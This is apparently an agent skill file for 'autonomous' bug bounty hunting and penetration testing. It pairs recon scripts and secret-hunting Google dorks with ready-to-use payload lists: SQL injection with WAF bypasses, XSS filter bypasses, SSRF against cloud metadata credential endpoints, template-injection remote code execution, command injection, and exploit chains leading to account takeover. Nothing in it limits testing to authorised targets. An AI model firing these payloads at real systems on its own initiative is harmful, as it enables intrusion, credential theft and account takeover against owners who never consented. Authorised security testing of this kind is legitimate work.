---
name: bug-bounty-hunter
description: Comprehensive offensive security skill for autonomous bug bounty hunting, penetration testing, CVE research, exploit development, and vulnerability discovery across web, API, mobile, cloud, and network attack surfaces.
---

# BUG BOUNTY HUNTER — TECHNICAL SKILL ENGINE (v17)

> 🔒 **SYNC 3/3:**
> - Master System Instruction: **AGENTS.md**
> - Core Operational Rules: **RULES.md**

---

## 1. RECONNAISSANCE ENGINE

### 1.1. Passive Recon — Subdomain Enumeration

```python
import requests

def crtsh_subdomains(domain: str) -> list[str]:
    """Query crt.sh Certificate Transparency logs."""
    url = f"https://crt.sh/?q=%.{domain}&output=json"
    try:
        r = requests.get(url, timeout=30)
        if r.status_code == 200:
            subs = set()
            for entry in r.json():
                for sub in entry.get("name_value","").split("\n"):
                    sub = sub.strip().lower()
                    if sub.endswith(f".{domain}") or sub == domain:
                        subs.add(sub)
            return sorted(subs)
    except Exception as e:
        print(f"[!] crt.sh error: {e}")
    return []

def wayback_urls(domain: str) -> list[str]:
    """Query Wayback Machine for historical URLs."""
    url = f"https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey"
    try:
        r = requests.get(url, timeout=60)
        if r.status_code == 200:
            return [row[0] for row in r.json()[1:]]
    except Exception as e:
        print(f"[!] Wayback error: {e}")
    return []
```

### 1.2. Google Dork Templates

```
site:{domain} filetype:pdf | filetype:sql | filetype:env | filetype:log | filetype:bak
site:{domain} inurl:admin | inurl:login | inurl:dashboard | inurl:api | inurl:swagger
site:{domain} intext:"password" | intext:"api_key" | intext:"secret" | intext:"token"
site:{domain} inurl:".git" | inurl:".env" | inurl:"wp-config" | inurl:".svn"
site:{domain} intext:"error" | intext:"exception" | intext:"stack trace" | intext:"syntax error"
```

---

## 2. PAYLOAD LIBRARIES

### 2.1. SQL Injection Payloads

```
# Error-based
' OR '1'='1'--
' AND 1=CONVERT(int,(SELECT @@version))--
' AND extractvalue(1,concat(0x7e,(SELECT version())))--

# Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,NULL FROM users--

# Blind (Boolean)
' AND 1=1--    (true)
' AND 1=2--    (false)
' AND substring(@@version,1,1)='5'--

# Blind (Time)
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
' AND pg_sleep(5)--

# WAF Bypass
/*!50000UNION*//*!50000SELECT*/1,2,3
UniOn%0aSeLeCt%0a1,2,3
' UNION%23%0ASELECT 1,2,3--
```

### 2.2. XSS Payloads

```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.domain)</script>

<!-- Filter Bypass -->
<img src=x onerror="&#97;lert(1)">
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>


### 2.3. SSRF Payloads

```
http://127.0.0.1 | http://localhost | http://[::1]
http://169.254.169.254/latest/meta-data/  (AWS IMDS)
http://metadata.google.internal/  (GCP)
http://0x7f000001 (Hex) | http://2130706433 (Decimal) | http://127.1 (Short)
http://127.0.0.1.nip.io (DNS rebinding)
http://[0:0:0:0:0:ffff:127.0.0.1] (IPv6)
http://evil.com@127.0.0.1 (Credential section)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 2.4. SSTI Payloads

```
# Detection: {{7*7}}→49 | ${7*7}→49 | <%=7*7%>→49 | {{7*'7'}}→7777777 (Jinja2)
# Jinja2 RCE:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
# Twig RCE:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
# Freemarker RCE:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### 2.5. Command Injection

```
; id | | id | || id | & id | && id | $(id) | `id` | %0a id | %0d%0a id
```

---

## 3. EXPLOIT CHAIN PATTERNS

```
Chain 1: Open Redirect → OAuth Token Theft → Account Takeover
Chain 2: Self-XSS → CSRF → Stored XSS → Account Takeover
Chain 3: IDOR → PII Disclosure → Password Reset → Account Takeover
Chain 4: SSRF → Cloud Metadata → AWS Keys → Full Compromise
Chain 5: Race Condition → Double-Spend → Financial Impact
Chain 6: Subdomain Takeover → Cookie Theft → Session Hijacking
Chain 7: CRLF Injection → Cache Poisoning → Stored XSS at Scale
Chain 8: GraphQL Introspection → Hidden Mutation → Privilege Escalation
```

---

## 4. CVE RESEARCH INTEGRATION

```python
import requests

def search_nvd_cves(keyword: str, results_per_page: int = 20) -> list[dict]:
    """Search NVD for CVEs related to a technology/product."""
    url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    params = {"keywordSearch": keyword, "resultsPerPage": results_per_page}
    try:
        r = requests.get(url, params=params, timeout=30)
        if r.status_code == 200:
            cves = []
            for vuln in r.json().get("vulnerabilities", []):
                cve = vuln.get("cve", {})
                desc = next((d["value"] for d in cve.get("descriptions",[]) if d.get("lang")=="en"), "")
                metrics = cve.get("metrics", {})
                score = None
                for k in ["cvssMetricV31","cvssMetricV30","cvssMetricV2"]:
                    if k in metrics:
                        score = metrics[k][0].get("cvssData",{}).get("baseScore")
                        break
                cves.append({"id": cve.get("id",""), "description": desc, "cvss": score})
            return cves
    except Exception as e:
        print(f"[!] NVD error: {e}")
    return []
```

**Check these tech categories against CVE databases:**
Web Servers (Apache, Nginx, IIS, Tomcat) | Frameworks (Spring, Django, Laravel, Rails, Express, Next.js) | CMS (WordPress, Drupal, Joomla) | Databases (MySQL, PostgreSQL, MongoDB, Redis) | CI/CD (Jenkins, GitLab CI, GitHub Actions) | Containers (Docker, Kubernetes)

---

## 5. AUTOMATION SCRIPTS (in `scripts/` directory)

- `recon.py` — Automated reconnaissance pipeline
- `vuln_scanner.py` — Multi-vector vulnerability scanner
- `cve_lookup.py` — CVE research and correlation tool
- `report_generator.py` — Bug bounty report generator
- `js_analyzer.py` — JavaScript file analysis for secrets/endpoints
- `param_miner.py` — Hidden parameter discovery
- `race_condition.py` — Race condition testing tool

---

## 6. WRITEUP ANALYSIS METHOD

1. **Extract vulnerability class** (CWE)
2. **Identify root cause** (missing validation, broken access control, etc.)
3. **Note discovery method** (fuzzing, code review, manual testing)
4. **Document exploitation technique** (step-by-step)
5. **Extract bypass techniques** (WAF/filter bypasses)
6. **Assess transferability** (can this work on other targets?)
7. **Note impact chain** (was it chained with other bugs?)
8. **Record remediation** (how was it fixed?)

Save to `notes/writeup-analysis/` with format: Title, Source, CWE, Technique, Key Takeaway, Applicability.

